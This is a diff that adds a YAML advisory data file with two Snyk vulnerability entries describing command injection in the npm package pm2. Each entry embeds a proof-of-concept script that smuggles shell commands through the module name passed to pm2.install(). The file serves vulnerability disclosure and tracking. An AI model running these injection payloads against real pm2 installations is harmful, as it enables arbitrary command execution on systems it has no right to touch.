@@ -1,0 +1,63 @@
+---
+- id: snykio:npm:pm2:474304
+  title: Command Injection
+  description: "[pm2][1] is a production process manager for Node.js applications
+    with a\nbuilt-in load balancer.\n\nAffected versions of this package are vulnerable
+    to Command Injection.\nIt is possible to inject arbitrary commands as part of
+    user input in the\n`Modularizer.install()` method within `lib/API/Modules/Modularizer.js`\nas
+    an `unsanitized module_name` variable. This input is eventually\nprovided to the
+    `spawn()` function and gets executed as a part of\nspawned `npm install MODULE_NAME
+    ----loglevel=error --prefix\nINSTALL_PATH` command.\n\n### PoC by bl4de   {#poc-by-bl4de}\n\n
+    \   // pm2_exploit.js\n    \n    \n    'use strict'\n    const pm2 = require('pm2')\n
+    \   \n    // payload - user controllable input\n    const payload = \"test;pwd;whoami;uname
+    -a;ls -l ~/playground/Node;\"\n    \n    pm2.connect(function (err) {\n        if
+    (err) {\n            console.error(err)\n            process.exit(2)\n        }\n
+    \   \n        pm2.start({\n            script: 'app.js' // fake app.js to supress
+    \"No script path - aborting\" error thrown from PM2\n        }, (err, apps) =>
+    {\n            pm2.install(payload, {}) // injection\n            pm2.disconnect()\n
+    \           if (err) {\n                throw err\n            }\n        })\n
+    \   })\n\n\n\n[1]: http://pm2.keymetrics.io\n"
+  affected_package: pm2
+  vulnerable_versions:
+  - "*"
+  severity: medium
+  package_manager: npm
+  cwe:
+  - CWE-78
+  disclosed_date: 2019-10-24
+  created_date: 2019-10-25
+  last_modified_date: 2019-10-25
+  credit:
+  - bl4de
+  references:
+  - https://hackerone.com/reports/633364
+  source_url: https://snyk.io/vuln/SNYK-JS-PM2-474304
+- id: snykio:npm:pm2:474345
+  title: Command Injection
+  description: "[pm2][1] is a production process manager for Node.js applications
+    with a\nbuilt-in load balancer.\n\nAffected versions of this package are vulnerable
+    to Command Injection.\nIt is possible to execute arbitrary commands within the
+    `pm2.import()`\nfunction when `tar.gz` archive is installed with a name provided
+    as user\ncontrolled input.\n\n### PoC by bl4de   {#poc-by-bl4de}\n\n    // pm2_exploit.js\n
+    \   \n    'use strict'\n    const pm2 = require('pm2')\n    \n    // payload -
+    user controllable input\n    const payload = \"foo.tar.gz;touch here;echo whoami>here;chmod
+    +x here;./here>whoamreallyare\"\n    \n    pm2.connect(function(err) {\n        if
+    (err) {\n            console.error(err)\n            process.exit(2)\n        }\n
+    \   \n        pm2.start({\n    \n        }, (err, apps) => {\n            pm2.install(payload,
+    {}) // injection\n            pm2.disconnect()\n            if (err) {\n                throw
+    err\n            }\n        })\n    })\n\n\n\n[1]: http://pm2.keymetrics.io\n"
+  affected_package: pm2
+  vulnerable_versions:
+  - "*"
+  severity: medium
+  package_manager: npm
+  cwe:
+  - CWE-78
+  disclosed_date: 2019-10-24
+  created_date: 2019-10-25
+  last_modified_date: 2019-10-25
+  credit:
+  - bl4de
+  references:
+  - https://hackerone.com/reports/630227
+  source_url: https://snyk.io/vuln/SNYK-JS-PM2-474345
